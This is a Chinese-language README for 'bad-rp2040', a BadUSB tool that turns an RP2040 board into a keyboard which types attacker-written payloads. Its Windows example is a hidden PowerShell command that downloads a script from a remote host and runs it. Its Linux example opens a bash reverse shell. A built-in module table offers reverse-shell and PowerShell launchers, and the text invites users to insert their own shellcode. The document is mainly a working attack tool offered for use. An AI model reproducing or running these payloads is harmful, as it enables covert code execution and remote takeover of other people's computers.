# bad-rp2040

第一版 还要修修

## 使用教程

虽然名字叫做bad-rp2040，但理论上它可以支持其他能够使用CircuitPython的板子。

* 第一步
  
  按住BOOT按键进入烧入模式从[这里](https://circuitpython.org/board/raspberry_pi_pico/)找到合适的CircuitPython固件烧入

* 第二步
  
  烧入完成后再下载项目文件，修改payload.txt为你想要的内容，之后写入磁盘模式的开发板

* 第三步
  
  重新插拔开发板，不出意外开发板会自动模拟按键输入编写好的payload


### payload语法

> 目前尚在开发中，很多功能并不全面画横线的表示正在开发中

可用案例：

#### windows

```badusb
set Time 1
POWERSHELL
TOGGLE_INPUT
ECHO powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.255.1:8029/a'))"
```

#### linux

```badusb
set Time 1
LINUX_OPENSHELL
LINUX_RESHELL 127.0.0.1 4444
```

将最后的echo内容替换为你的shellcode即可

内置了快捷使用的模块

| 命令     | 作用                       |
-----------|---------------------------|
| POWERSHELL | 快速拉起powershell     |
| TOGGLE_INPUT | 快速切换输入法     |
| LINUX_OPENSHELL | 快速拉起linux shell   |
| LINUX_RESHELL | 使用bash -i反弹shell模板   |
| ECHO | 输出字符串     |

根据需求调用即可，echo语句用于输出字符串

### 语法表

| 命令     | 作用                       |
-----------|---------------------------|
| set Time | 设置命令隔时间 不建议太快    |

#### 注意

如自行编写payload.txt，请注意windows的自动大小写问题

### 后续开发计划

短期
* 完成目前列出的所有模组
* 完成计划的语法

长期
* 是否可以做到监听键盘输入

![run](https://s2.loli.net/2024/12/04/d4NjluG9nEImwUB.png)
![shell](https://s2.loli.net/2024/12/04/oTHgaxBFnsqUGNM.png)
![linux](https://s2.loli.net/2024/12/05/s46Hu5qOYEkiKX3.png)